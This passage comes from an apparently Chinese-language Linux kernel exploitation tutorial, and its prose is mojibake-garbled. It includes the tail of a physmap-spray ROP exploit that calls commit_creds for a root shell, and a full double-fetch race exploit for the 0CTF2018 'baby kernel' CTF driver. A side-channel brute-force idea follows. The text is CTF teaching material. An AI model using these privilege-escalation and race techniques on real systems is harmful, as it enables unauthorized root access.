ret;<br><br>    <span class="hljs-comment">// rop chain</span><br>    rop[idx++] = pop_rdi_ret;<br>    rop[idx++] = init_cred;<br>    rop[idx++] = commit_creds;<br>    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>    rop[idx++] = *(<span class="hljs-keyword">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-keyword">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = (<span class="hljs-keyword">size_t</span>) getRootShell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    saveStatus();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;dev fd!&quot;</span>);<br><br>    page_size = sysconf(_SC_PAGESIZE);<br><br>    <span class="hljs-comment">// construct per-page rop chain</span><br>    physmap_spray_arr[<span class="hljs-number">0</span>] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    constructROPChain(physmap_spray_arr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">// spray physmap, so that we can easily hit one of them</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying physmap...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">15000</span>; i++)<br>    &#123;<br>        physmap_spray_arr[i] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!physmap_spray_arr[i])<br>            errExit(<span class="hljs-string">&quot;oom for physmap spray!&quot;</span>);<br>        <span class="hljs-built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="hljs-number">0</span>], page_size);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger physmap one_gadget...&quot;</span>);<br>    <span class="hljs-comment">//sleep(5);</span><br><br>    try_hit = <span class="hljs-number">0xffff888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>        <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>        <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>        <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>        <span class="hljs-string">&quot;mov r9,    pop_rsp_ret;&quot;</span>   <span class="hljs-comment">// stack migration again</span><br>        <span class="hljs-string">&quot;mov r8,    try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rax,   0x10;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx,   try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi,   0x1bf52;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi,   dev_fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿è¡Œå³å¯ç¨³å®šææƒ</p><p><a href="https://s2.loli.net/2022/05/07/HdjzW6RvGfOtqPk.png"><img src="https://s2.loli.net/2022/05/07/HdjzW6RvGfOtqPk.png" alt="image.png"></a></p><h1 id="æ¡ä»¶ç«äº‰ï¼ˆRace-conditionï¼‰"><a href="#æ¡ä»¶ç«äº‰ï¼ˆRace-conditionï¼‰" class="headerlink" title="æ¡ä»¶ç«äº‰ï¼ˆRace conditionï¼‰"></a>æ¡ä»¶ç«äº‰ï¼ˆRace conditionï¼‰</h1><p>é€šå¸¸æƒ…å†µä¸‹åœ¨ç”¨æˆ·æ€ä¸‹çš„ pwn å½“ä¸­æˆ‘ä»¬åªæœ‰ä¸€ä¸ªç‹¬ç«‹è¿è¡Œçš„ä¸»çº¿ç¨‹ï¼Œå¹¶ä¸å­˜åœ¨æ‰€è°“æ¡ä»¶ç«äº‰çš„æƒ…å†µï¼Œä½†åœ¨ kernel pwn å½“ä¸­<strong>ç”±æ”»å‡»è€…è´Ÿè´£ç¼–å†™ç”¨æˆ·æ€ç¨‹åºï¼Œå¯ä»¥å¾ˆè½»æ˜“åœ°å¯åŠ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶è¿è¡Œ</strong>ï¼Œä»è€Œè½»æ˜“åœ°äº§ç”Ÿæ¡ä»¶ç«äº‰</p><blockquote><p>ä¸è¿‡è¿‘å¹´æ¥éšç€ glibc pwn çš„å¥—è·¯é€æ¸æŒ–æ˜æ®†å°½ï¼Œç”¨æˆ·æ€ä¸‹çš„ pwn é¢˜ä¹Ÿå¼€å§‹é€æ¸è„±ç¦» glibc æœ¬èº«çš„åˆ©ç”¨è€Œå‘å¤šä¸ªå…¶ä»–æ–¹å‘å‘å±•ï¼Œå…¶ä¸­ä¸€ä¸ªçƒ­é—¨æ–¹å‘ä¾¿æ˜¯ç”¨æˆ·æ€ä¸‹å¤šçº¿ç¨‹é€ æˆæ¡ä»¶ç«äº‰</p><blockquote><p>è¿˜æœ‰ä¸€ä¸ªé€æ¸çƒ­é—¨çš„æ–¹å‘ä¾¿æ˜¯ musl C å †åˆ©ç”¨</p></blockquote></blockquote><h2 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h2><p><code>double fetch</code> ç›´è¯‘å°±æ˜¯ <code>å–å€¼ä¸¤æ¬¡</code>ï¼Œç›´æ¥ç†è§£å°±æ˜¯åœ¨ä¸€æ¬¡æ“ä½œå½“ä¸­è¦<strong>ä¸¤æ¬¡ï¼ˆæˆ–æ˜¯å¤šæ¬¡ï¼‰é‡æ–°è·å–æŸä¸ªå¯¹è±¡çš„å€¼</strong>ï¼Œå¯èƒ½å‡ºç°åœ¨ä¸‹é¢è¿™ç§æƒ…å†µå½“ä¸­ï¼š</p><ul><li>æœ‰ä¸€å¤§æ®µæ•°æ®è¦ä»ç”¨æˆ·ç©ºé—´ä¼ ç»™å†…æ ¸ç©ºé—´ï¼Œä½†æ˜¯ç›´æ¥ä¼ é€æ•´å—æ•°æ®ä¼šé€ æˆè¾ƒå¤§çš„å¼€é”€ï¼Œæ•…é€‰æ‹©<strong>åªå‘å†…æ ¸ä¼ é€ä¸€ä¸ªæŒ‡å‘ç”¨æˆ·åœ°å€ç©ºé—´çš„æŒ‡é’ˆ</strong></li><li>åœ¨åç»­çš„æ“ä½œå½“ä¸­å†…æ ¸éœ€è¦<strong>å¤šæ¬¡</strong>é€šè¿‡è¯¥æŒ‡é’ˆè·å–åˆ°ç”¨æˆ·ç©ºé—´çš„æ•°æ®</li></ul><p>ä¾‹å¦‚ï¼šå†…æ ¸ç¬¬ä¸€æ¬¡å…ˆè·å–æ•°æ®è¿›è¡Œåˆæ³•æ€§éªŒè¯ï¼Œç¬¬äºŒæ¬¡å†è·å–æ•°æ®è¿›è¡Œä½¿ç”¨ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰</p><p><a href="https://i.loli.net/2021/09/08/pqLSVaINQ3zAsmO.png"><img src="https://i.loli.net/2021/09/08/pqLSVaINQ3zAsmO.png" alt="img"></a></p><p>ä¸éš¾çœ‹å‡ºï¼Œè‹¥æ˜¯æ•´ä¸ªæ“ä½œæµç¨‹è¿‡é•¿ï¼Œåˆ™ç”¨æˆ·è¿›ç¨‹ä¾¿æœ‰æœºä¼šä¿®æ”¹è¿™ä¸€å—æ•°æ®ï¼Œ<strong>ä½¿å¾—å†…æ ¸åœ¨ä¸¤æ¬¡è®¿é—®è¿™å—ç©ºé—´æ—¶æ‰€è·å¾—çš„æ•°æ®ä¸ä¸€è‡´ï¼Œä»è€Œä½¿å¾—å†…æ ¸è¿›å…¥ä¸åŒçš„æ‰§è¡Œæµç¨‹</strong>ï¼Œç”¨æˆ·è¿›ç¨‹ç”šè‡³å¯ä»¥<strong>ç›´æ¥å¼€æ–°çš„çº¿ç¨‹è¿›è¡Œç«äº‰æ¥å®ç°è¿™ä¸ªæ•ˆæœ</strong></p><p><a href="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png"><img src="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png" alt="img"></a></p><p>é€šè¿‡åœ¨ first fetch ä¸ second fetch ä¹‹é—´çš„ç©ºæŒ¡ä¿®æ”¹æ•°æ®ä»è€Œæ”¹å˜å†…æ ¸æ‰§è¡Œæµçš„åˆ©ç”¨æ‰‹æ³•ä¾¿è¢«ç§°ä¹‹ä¸º<code>double fetch</code></p><h3 id="ä¾‹é¢˜ï¼š0CTF2018-Final-baby-kernel"><a href="#ä¾‹é¢˜ï¼š0CTF2018-Final-baby-kernel" class="headerlink" title="ä¾‹é¢˜ï¼š0CTF2018 Final - baby kernel"></a>ä¾‹é¢˜ï¼š0CTF2018 Final - baby kernel</h3><h4 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>é¦–å…ˆæŸ¥çœ‹å¯åŠ¨è„šæœ¬ï¼ŒåŸºæœ¬æ²¡å¼€é¢å¤–çš„ä¿æŠ¤</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs BASH">qemu-system-x86_64 \<br>-m 256M -smp 2,cores=2,threads=1  \<br>-kernel ./vmlinuz-4.15.0-22-generic \<br>-initrd  ./core.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot;</span> \<br>-cpu qemu64 \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></div></td></tr></table></figure><p>è§£å‹æ–‡ä»¶ç³»ç»Ÿï¼Œå‘ç°å¯ç–‘é©±åŠ¨æ–‡ä»¶ <code>baby.ko</code>ï¼Œæƒ¯ä¾‹åœ° <code>checksec</code>ï¼Œåªå¼€äº† NX</p><p><a href="https://i.loli.net/2021/09/07/HkD2ygAPvb9BMSu.png"><img src="https://s2.loli.net/2023/02/06/vC8DsxV1RELNfOq.png" alt="image.png"></a></p><p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼Œåªç®€å•åœ°å®šä¹‰äº†ä¸€ä¸ª ioctl</p><p><a href="https://i.loli.net/2021/09/07/Czo7jDP5YyXUKhr.png"><img src="https://s2.loli.net/2023/02/06/QhHVY7tb18j6f9F.png" alt="image.png"></a></p><p>å…¶ä¸­å‚æ•° <code>0x6666</code> å¯ä»¥è·å¾— flag åœ¨å†…æ ¸ä¸­çš„åœ°å€ï¼Œå‚æ•° <code>0x1337</code> åˆ™ä¼šå°†æˆ‘ä»¬ä¼ å…¥çš„ flag ä¸çœŸæ­£çš„ flag è¿›è¡Œå¯¹æ¯”ï¼Œè‹¥æ­£ç¡®åˆ™ä¼šå°† flag æ‰“å°å‡ºæ¥</p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œ<code>dmesg</code> æƒé™å¼€äº†ï¼Œæ•´æŒºå¥½</p><p><a href="https://i.loli.net/2021/09/08/Q8Hyg4jGnSok2tW.png"><img src="https://s2.loli.net/2023/02/06/X7Ji4CRyONTMZ3Q.png" alt="image.png"></a></p><p>ç®€å•åˆ†æå¯çŸ¥æˆ‘ä»¬åº”å½“ä¼ å…¥å¦‚ä¸‹ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">flag</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> * flag_addr;<br>    <span class="hljs-keyword">int</span> flag_len;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­ <code>flag_len</code> å‚æ•°ä¸ flag çš„é•¿åº¦å¯¹æ¯”ï¼Œåœ¨ .ko æ–‡ä»¶ä¸­ flag çš„é•¿åº¦ä¸º 33</p><p>åœ¨ <code>0x1337</code> åŠŸèƒ½å½“ä¸­è¿˜ä¼šé€šè¿‡ <code>_chk_range_not_ok()</code> å‡½æ•°æ£€æŸ¥æˆ‘ä»¬ä¼ å…¥çš„åœ°å€èŒƒå›´æ˜¯å¦åˆæ³•ï¼š</p><p><a href="https://i.loli.net/2021/09/08/QjFdxAHLOTkctUB.png"><img src="https://s2.loli.net/2023/02/06/dWXwlmEyQAV1ZYf.png" alt="image.png"></a></p><p>add æŒ‡ä»¤ä¼šå½±å“ CFï¼ˆäº§ç”Ÿè¿›ä½/å€Ÿä½ï¼‰å’Œ OFï¼ˆä¸¤æ•°æœ€é«˜ä½ç›¸åŒï¼Œç»“æœæœ€é«˜ä½æ”¹å˜ï¼‰æ ‡å¿—ä½ï¼Œv3è·å¾—çš„å°±æ˜¯ä¸¤æ•°ç›¸åŠ çš„ CF ä½ï¼Œè¿™é‡Œä¸€èˆ¬ä¸º0ï¼ˆé™¤éä½ ä¼ å…¥ <code>0xffffffffffffffff</code> é™„è¿‘çš„æ•°ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥çœ‹å¦ä¸€ä¸ªåˆ¤æ–­ï¼ša3 æ˜¯å¦å°äº v4</p><p>a3 ä¸º current_task çš„åœ°å€åŠ ä¸Š 0x1358 å¤„æ‰€å­˜åœ°å€ï¼Œå¤§æ¦‚æ˜¯ <code>task_struct-&gt;thread-&gt;fpu-&gt;state</code> è¿™ä¸ªè”åˆä½“å†…çš„æŸä¸ªä½ç½®ä¸Šå­˜çš„ä¸€ä¸ªå€¼ï¼Œè€Œ v4 åˆ™æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ flag æœ€åä¸€ä¸ªå­—èŠ‚çš„åœ°å€ï¼Œå³æˆ‘ä»¬ä¼ å…¥çš„ flag çš„åœ°å€ä¸èƒ½å¤Ÿå¤§äºè¿™ä¸ªå€¼</p><p>åˆ‡ root è°ƒä¸€ä¸‹æˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªå€¼ä¸º <code>0x7ffffffff000</code></p><p><a href="https://i.loli.net/2021/09/08/WFU9rzp1vSaR3hP.png"><img src="https://s2.loli.net/2023/02/06/n4BMChKeRb9cyfl.png" alt="image.png"></a></p><p>è¿™ä¸ªä½ç½®åˆšå¥½æ˜¯ç”¨æˆ·åœ°å€ç©ºé—´çš„æ ˆåº•ï¼Œå³æˆ‘ä»¬ä¼ å…¥çš„ flag çš„åœ°å€ä¸èƒ½ä¸ºç”¨æˆ·åœ°å€ç©ºé—´å¤–çš„åœ°å€</p><p><a href="https://i.loli.net/2021/09/08/tJ7uiEhCG4acbsd.png"><img src="https://s2.loli.net/2023/02/06/tNEsfPCaXxmWZhB.png" alt="image.png"></a></p><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>è™½ç„¶ flag å­˜å‚¨çš„åœ°å€å·²çŸ¥ï¼Œä½†æ˜¯ä½äºå†…æ ¸åœ°å€ç©ºé—´å½“ä¸­ï¼Œæˆ‘ä»¬å°†ä¹‹ç›´æ¥ä¼ ç»™æ¨¡å—å¹¶ä¸èƒ½é€šè¿‡éªŒè¯ï¼Œé‚£ä¹ˆè¿™é‡Œå°±è€ƒè™‘ double fetchâ€”â€”å…ˆä¼ å…¥ä¸€ä¸ªç”¨æˆ·åœ°å€ç©ºé—´ä¸Šçš„åˆæ³•åœ°å€ï¼Œå¼€å¦ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œç«äº‰ä¸æ–­ä¿®æ”¹å…¶ä¸ºå†…æ ¸ç©ºé—´ flag çš„åœ°å€ï¼Œåªè¦æœ‰ä¸€æ¬¡å‘½ä¸­æˆ‘ä»¬ä¾¿èƒ½è·å¾— flag</p><p><a href="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png"><img src="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png" alt="img"></a></p><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">pthread_t</span> compete_thread;<br><span class="hljs-keyword">void</span> * real_addr;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x20</span>] = <span class="hljs-string">&quot;arttnba3&quot;</span>;<br><span class="hljs-keyword">int</span> competetion_times = <span class="hljs-number">0x1000</span>, status = <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> * flag_addr;<br>    <span class="hljs-keyword">int</span> flag_len;<br>&#125;flag = &#123;.flag_addr = buf, .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-title">competetionThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (status)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; competetion_times; i++)<br>            flag.flag_addr = real_addr;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd, result_fd, addr_fd;<br>    <span class="hljs-keyword">char</span> * temp, *flag_addr_addr;<br><br>    fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDWR);<br>    ioctl(fd, <span class="hljs-number">0x6666</span>);<br>    system(<span class="hljs-string">&quot;dmesg | grep flag &gt; addr.txt&quot;</span>);<br>    temp = (<span class="hljs-keyword">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);    <br>    addr_fd = open(<span class="hljs-string">&quot;./addr.txt&quot;</span>, O_RDONLY);<br>    temp[read(addr_fd, temp, <span class="hljs-number">0x100</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    flag_addr_addr = <span class="hljs-built_in">strstr</span>(temp, <span class="hljs-string">&quot;Your flag is at &quot;</span>) + <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Your flag is at &quot;</span>);<br>    real_addr = strtoull(flag_addr_addr, flag_addr_addr + <span class="hljs-number">16</span>, <span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] flag addr: %llx&quot;</span>, real_addr);<br><br>    pthread_create(&amp;compete_thread, <span class="hljs-literal">NULL</span>, competetionThread, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span> (status)<br>    &#123;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; competetion_times; i++)<br>        &#123;<br>            flag.flag_addr = buf;<br>            ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br>        &#125;<br>        system(<span class="hljs-string">&quot;dmesg | grep flag &gt; result.txt&quot;</span>);<br>        result_fd = open(<span class="hljs-string">&quot;./result.txt&quot;</span>, O_RDONLY);<br>        read(result_fd, temp, <span class="hljs-number">0x1000</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(temp, <span class="hljs-string">&quot;flag&#123;&quot;</span>))<br>            status = <span class="hljs-number">0</span>;<br>    &#125;<br>    pthread_cancel(compete_thread);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] competetion end!&quot;</span>);<br>    system(<span class="hljs-string">&quot;dmesg | grep flag&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿è¡Œå³å¾— flag</p><p><a href="https://i.loli.net/2021/09/08/NIrbAYh8UklgEsc.png"><img src="https://s2.loli.net/2023/02/06/3lWDCjP8ahfwYRI.png" alt="image.png"></a></p><blockquote><p>ç¬”è€…åŸæœ¬æƒ³ç”¨ fscanf è¯»å…¥ flag åœ°å€ï¼Œä½†æ˜¯ä¸æ˜åŸå› ä¸€ç›´ä¸èƒ½æˆåŠŸï¼Œç„¶ååˆæ¢äº† sscanf ä¹Ÿä¸èƒ½æˆåŠŸâ€¦æœ€ååªå¥½æ¢äº† strtoull â€¦</p></blockquote><blockquote><h4 id="extraï¼šæµ‹ä¿¡é“æ”»å‡»"><a href="#extraï¼šæµ‹ä¿¡é“æ”»å‡»" class="headerlink" title="extraï¼šæµ‹ä¿¡é“æ”»å‡»"></a>extraï¼šæµ‹ä¿¡é“æ”»å‡»</h4><p>åœ¨è¿›è¡Œæ¯”å¯¹æ—¶å¹¶æ²¡æœ‰æ£€éªŒ flag åœ°å€çš„åˆæ³•æ€§ï¼Œè€ƒè™‘å¦‚ä¸‹å†…å­˜å¸ƒå±€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">|                              |    &lt;---- unallocated page</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |    &lt;---- page alloc by mmap</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                     flag&#123;...X|</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |    &lt;---- unallocated page</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure><p>æˆ‘ä»¬å°† flag æ”¾åœ¨é€šè¿‡ mmap åˆ†é…è€Œæ¥çš„å†…å­˜é¡µçš„æœ«å°¾ï¼Œå…¶æœ€åä¸€ä¸ªå­—ç¬¦ <code>X</code> æ˜¯æˆ‘ä»¬å°†è¦çˆ†ç ´çš„æœªçŸ¥å­—ç¬¦</p><p>å¯¹äºå¾…æ¯”å¯¹å­—ç¬¦ <code>X</code> è€Œè¨€ï¼Œè‹¥æ˜¯æ¯”å¯¹å¤±è´¥åˆ™ ioctl ä¼šç›´æ¥è¿”å›ï¼Œè‹¥æ˜¯æ¯”å¯¹æˆåŠŸåˆ™æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€å¼ å†…å­˜é¡µä¸­è¿›è¡Œè§£å¼•ç”¨ï¼Œ<strong>æ­¤æ—¶å°†ä¼šç›´æ¥é€ æˆ kernel panic</strong></p><p>ç”±äº flag è¢«ç¡¬ç¼–ç åœ¨ <code>.ko</code> æ–‡ä»¶ä¸­ï¼Œæ•…é€šè¿‡æ˜¯å¦é€ æˆ kernel panic å¯ä»¥é€å­—ç¬¦çˆ†ç ´ flag å†…å®¹</p><p>ASCII å¯è§å­—ç¬¦ 95 ä¸ªï¼Œflag é•¿åº¦ 33ï¼Œå¼€å¤´ <code>flag&#123;</code> æœ«å°¾ <code>&#125;</code> å‡å»6ä¸ªå­—ç¬¦ï¼Œæœ€å¤šåªéœ€è¦çˆ†ç ´ <strong>26 * 95 = 2470</strong> æ¬¡ä¾¿èƒ½å¤Ÿè·å¾— flag</p><p>æ¯”è¾ƒéœ€è¦è€å¿ƒï¼ˆå› ä¸ºæ‰“è¿œç¨‹ä¼ æ–‡ä»¶å¾ˆéº»çƒ¦ï¼‰ï¼Œè¿™é‡Œé™„ä¸Šä¸€ä¸ªæ¯”è¾ƒæ–¹ä¾¿çš„ expï¼Œä¸ç”¨æ¯æ¬¡æ‰“éƒ½é‡æ–°ç¼–è¯‘ä¸€æ¬¡ï¼Œåªéœ€è¦å°† flag ä½œä¸ºå‚æ•°ä¼ è¿›å»å°±è¡Œäº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span 